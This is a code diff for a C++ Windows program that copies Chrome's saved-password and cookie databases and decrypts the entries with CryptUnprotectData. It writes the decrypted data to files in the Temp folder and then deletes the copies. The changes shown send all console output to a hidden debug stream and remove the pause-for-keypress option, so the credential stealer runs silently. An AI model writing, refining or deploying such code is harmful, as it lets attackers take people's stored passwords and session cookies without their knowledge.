@@ -10,8 +10,8 @@
 using namespace std;
 
 string strTempPath("");
-
 stringstream debug(string(""));
+
 /*
 ** Pass sqlite3 handler, iterate over queried rows and decrypt each password by copying bytes from password_value
 ** column to DATA_BLOB data structure which is convient for Win32API CryptUnprotectData function
@@ -27,17 +27,17 @@ stringstream getPass(
 	/* Compile the SELECT statement into a virtual machine. */
 	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
 	if (rc != SQLITE_OK) {
-		cout << "statement failed rc = " << rc << endl;
+		debug << "statement failed rc = " << rc << endl;
 		return dump;
 	}
-	cout << "statement prepared " << endl;
+	debug << "statement prepared " << endl;
 
 	/* So call sqlite3_step() once
 	** only. Normally, we would keep calling sqlite3_step until it
 	** returned something other than SQLITE_ROW.
 	*/
 	rc = sqlite3_step(pStmt);
-	cout << "RC: " << rc << endl;
+	debug << "RC: " << rc << endl;
 	while (rc == SQLITE_ROW) {
 		string decrypted("<failed>");
 
@@ -105,10 +105,10 @@ stringstream getCookies(
 	/* Compile the SELECT statement into a virtual machine. */
 	rc = sqlite3_prepare(db, zSql, -1, &pStmt, 0);
 	if (rc != SQLITE_OK) {
-		cout << "statement failed rc = " << rc << endl;
+		debug << "statement failed rc = " << rc << endl;
 		return dump;
 	}
-	cout << "statement prepared " << endl;
+	debug << "statement prepared " << endl;
 
 	/* So call sqlite3_step() once
 	** only. Normally, we would keep calling sqlite3_step until it
@@ -116,7 +116,7 @@ stringstream getCookies(
 	*/
 
 	rc = sqlite3_step(pStmt);
-	cout << "RC: " << rc << endl;
+	debug << "RC: " << rc << endl;
 	while (rc == SQLITE_ROW) {
 		string base64("<failed>");
 		string decrypted("<failed>");
@@ -169,13 +169,13 @@ sqlite3* getDBHandler(const char* dbFilePath) {
 	int rc = sqlite3_open((strTempPath + dbFilePath).c_str(), &db);
 	if (rc)
 	{
-		cerr << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
+		debug << "Error opening SQLite3 database: " << sqlite3_errmsg(db) << endl << endl;
 		sqlite3_close(db);
 		return nullptr;
 	}
 	else
 	{
-		cout << dbFilePath << " DB Opened." << endl << endl;
+		debug << dbFilePath << " DB Opened." << endl << endl;
 		return db;
 	}
 }
@@ -243,9 +243,9 @@ int deleleteDB(const char *fileName) {
 		string filePath = strTempPath + fileName;
 
 		if (remove(filePath.c_str()) != 0)
-			cout << "Could not delete " << filePath << endl;
+			debug << "Could not delete " << filePath << endl;
 		else
-			cout << filePath << " deleted... Bye bye" << endl;
+			debug << filePath << " deleted... Bye bye" << endl;
 
 		return 0;
 	}
@@ -253,11 +253,16 @@ int deleleteDB(const char *fileName) {
 	{
 	}
 
+
 	return 0;
 }
 
 void PasswordRun(LPSTR lpCmdLine)
 {
+	debug.clear();
+
+	My::Debug("PasswordRun:==>");
+
 	strTempPath = string(getenv("LOCALAPPDATA")) + "\\Temp\\";
 
 	std::istringstream ss(lpCmdLine);
@@ -277,9 +282,10 @@ void PasswordRun(LPSTR lpCmdLine)
 	if (paths.empty())
 		paths.push_back(getenv("LOCALAPPDATA") + std::string("\\Google\\Chrome\\User Data\\Default\\"));
 
-
 	for (size_t index = 0; index < paths.size(); index++/*std::vector<std::string>::iterator itr = paths.begin(); itr != paths.end(); itr++*/)
 	{
+		My::Debug("PasswordRun: " + paths[index]);
+
 		string profile("Profile" + std::to_string(index));
 		std::string path = paths[index];
 
@@ -300,11 +306,13 @@ void PasswordRun(LPSTR lpCmdLine)
 			std::string tempDB = "p8791.db";
 
 			// Open Database
-			cout << "Copying from" << path << "to" << tempDB << endl;
+			My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
 			copyDB(db.c_str(), tempDB.c_str());
+
 			sqlite3 *passwordsDB = getDBHandler(tempDB.c_str());
+
 			stringstream passwords = getPass(passwordsDB);
-			//	cout << passwords.str();
+			//	debug << passwords.str();
 
 			string fileName = strTempPath + "p8791-" + profile + ".bin";
 			std::ofstream myfile(fileName, std::ios::out | std::ios::binary);
@@ -312,18 +320,18 @@ void PasswordRun(LPSTR lpCmdLine)
 			myfile.close();
 
 			if (sqlite3_close(passwordsDB) == SQLITE_OK)
-				cout << "DB connection closed properly" << endl;
+				debug << "DB connection closed properly" << endl;
 			else
-				cout << "Failed to close DB connection" << endl;
+				debug << "Failed to close DB connection" << endl;
 
 			deleleteDB(tempDB.c_str());
 		}
 		catch(...)
 		{
-
+			My::Debug(std::string("PasswordRun: Exception"));
 		}
 
-		bool flagCookies = false, flagPause = false;
+		bool flagCookies = false;
 		try {
 			ifstream f((strTempPath + "cookies.bin").c_str());
 			flagCookies = f.good();
@@ -339,9 +347,6 @@ void PasswordRun(LPSTR lpCmdLine)
 			case 'c':
 				flagCookies = true;
 				break;
-			case 'p':
-				flagPause = true;
-				break;
 			}
 		}
 		if (flagCookies) {
@@ -351,7 +356,7 @@ void PasswordRun(LPSTR lpCmdLine)
 				std::string tempDB = "c8791.db";
 
 				// Open Database
-				cout << "Copying from" << path << "to" << tempDB << endl;
+				My::Debug(std::string("PasswordRun: ") + "Copying from " + path + " to " + tempDB);
 				copyDB(db.c_str(), tempDB.c_str());
 				sqlite3 *cookiesDb = getDBHandler(tempDB.c_str());
 				stringstream cookies = getCookies(cookiesDb);
@@ -362,19 +367,19 @@ void PasswordRun(LPSTR lpCmdLine)
 				myfile.close();
 
 				if (sqlite3_close(cookiesDb) == SQLITE_OK)
-					cout << "DB connection closed properly" << endl;
+					debug << "DB connection closed properly" << endl;
 				else
-					cout << "Failed to close DB connection" << endl;
+					debug << "Failed to close DB connection" << endl;
 
 				deleleteDB(tempDB.c_str());
 			}
 			catch(...)
 			{
-
+				My::Debug(std::string("PasswordRun: Exception"));
 			}
 		}
-
-		if (!flagPause)
-			cin.get();
 	}
+
+	My::Debug(debug.str());
+	My::Debug("PasswordRun:<--");
 }
